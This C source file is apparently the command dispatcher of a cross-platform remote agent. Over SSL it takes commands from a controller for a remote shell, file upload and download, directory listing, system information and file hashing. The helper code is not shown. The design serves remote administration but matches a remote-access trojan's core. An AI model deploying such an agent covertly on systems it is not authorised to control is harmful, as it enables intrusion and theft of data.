#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <openssl/ssl.h>

#include "hash_file.h"


#ifdef _WIN64
#include "../Windows/send_receive.h"
#include "../Windows/systeminfo.h"
#include "../Windows/file_transfer.h"
#include "../Windows/list_dir.h"
#include "../Windows/shell.h"
#else
#include "../Linux/send_receive.h"
#include "../Linux/systeminfo.h"
#include "../Linux/list_dir.h"
#include "../Linux/shell.h"
#include "../Linux/file_transfer.h"
#endif


void server_handler(SSL* ssl){
    while(true){
        char *data = receive_data(ssl);
        if (data == NULL){
            free(data);
            continue;
        }
        if (strcmp(data, "shutdown") == 0) {
            free(data);
            send_data(ssl, "ack");
            SSL_shutdown(ssl);
            SSL_free(ssl);
            exit(0);
        } else if (strcmp(data, "systeminfo") == 0) {
            systeminfo(ssl);
        } else if (strcmp(data, "checkfiles") == 0) {
            hash_file(ssl);
        } else if (strcmp(data, "list_dir") == 0) {
            listdir(ssl);
        } else if (strcmp(data, "shell") == 0) {
            shell(ssl);
        } else if (strcmp(data, "send_file") == 0) {
            send_file(ssl);
        } else if (strcmp(data, "recv_file") == 0) {
            recv_file(ssl);
        }           
        else {
            send_data(ssl, "Invalid command");
        }
        free(data);
    }
}